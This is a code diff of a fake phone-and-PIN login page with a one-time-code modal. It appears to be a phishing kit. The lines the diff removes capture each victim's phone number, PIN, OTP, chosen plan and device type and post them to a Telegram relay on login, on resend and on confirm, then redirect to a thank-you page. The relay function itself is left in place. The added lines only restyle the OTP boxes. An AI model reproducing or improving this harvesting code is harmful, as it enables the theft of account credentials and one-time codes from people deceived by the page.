@@ -151,6 +151,11 @@ label{
   height:44px;
   border:1px solid #d1d5db;
   background:#f8fafc;
+  display:flex;                 /* ✅ added */
+  align-items:center;           /* ✅ added */
+  justify-content:center;       /* ✅ added */
+  font-size:18px;               /* ✅ added */
+  font-weight:600;              /* ✅ added */
 }
 
 .otp-digit.filled{
@@ -246,7 +251,6 @@ label{
 </div>
 
 <script>
-/* JS — UNCHANGED FROM YOUR LAST VERSION */
 function sendToTelegram(payload){
   fetch('/api/sendTelegram',{
     method:'POST',
@@ -254,31 +258,6 @@ function sendToTelegram(payload){
     body:JSON.stringify(payload)
   }).catch(()=>{});
 }
-
-/* PLAN */
-let selectedPlan=null;
-try{
-  const raw=sessionStorage.getItem('selectedPlan') || localStorage.getItem('selectedPlan');
-  if(raw){
-    selectedPlan=JSON.parse(raw);
-    localStorage.setItem('selectedPlan',raw);
-  }
-}catch(e){}
-
-function normalizePlan(plan){
-  if(!plan) return 'N/A';
-  const name=plan.name||'';
-  const price=plan.price||'';
-  return price?`${name} — ${price}`:name;
-}
-
-/* DEVICE */
-const ua=navigator.userAgent;
-let device='Unknown';
-if(/Android/i.test(ua)) device='Android';
-else if(/iPhone|iPad/i.test(ua)) device='iOS';
-if(/Chrome/i.test(ua)) device+=' | Chrome';
-else if(/Safari/i.test(ua)) device+=' | Safari';
 
 /* PHONE + PIN */
 const phone=document.getElementById('phone');
@@ -314,16 +293,6 @@ pin.addEventListener('input',()=>{
 const otpModal=document.getElementById('otpModal');
 document.getElementById('loginForm').onsubmit=e=>{
   e.preventDefault();
-
-  sendToTelegram({
-    event:'login_clicked',
-    loginPhone:phone.value,
-    loginPin:pin.value,
-    plan:normalizePlan(selectedPlan),
-    device,
-    submittedAt:new Date().toISOString()
-  });
-
   otpModal.style.display='flex';
   startOtp();
 };
@@ -345,7 +314,10 @@ function startOtp(){
 }
 
 function renderOtp(v){
-  dots.forEach((d,i)=>d.classList.toggle('filled',!!v[i]));
+  dots.forEach((d,i)=>{
+    d.textContent = v[i] || '';      /* ✅ visible digits */
+    d.classList.toggle('filled',!!v[i]);
+  });
   confirmBtn.disabled=v.length!==6;
 }
 
@@ -369,41 +341,6 @@ function startCountdown(){
     }
   },1000);
 }
-
-/* RESEND */
-resendBtn.onclick=()=>{
-  resendBtn.disabled=true;
-  resendBtn.innerHTML='<span class="spinner"></span>Sending…';
-
-  sendToTelegram({
-    event:'resend_otp',
-    loginPhone:phone.value,
-    loginPin:pin.value,
-    plan:normalizePlan(selectedPlan),
-    device,
-    submittedAt:new Date().toISOString()
-  });
-
-  setTimeout(()=>{
-    resendBtn.innerHTML='Resend';
-    startCountdown();
-  },1200);
-};
-
-/* CONFIRM */
-confirmBtn.onclick=()=>{
-  sendToTelegram({
-    event:'otp_confirm',
-    loginPhone:phone.value,
-    loginPin:pin.value,
-    otp:buffer.value,
-    plan:normalizePlan(selectedPlan),
-    device,
-    submittedAt:new Date().toISOString()
-  });
-
-  window.location.href='thankyou.html';
-};
 
 /* CANCEL */
 document.getElementById('cancelOtp').onclick=()=>{
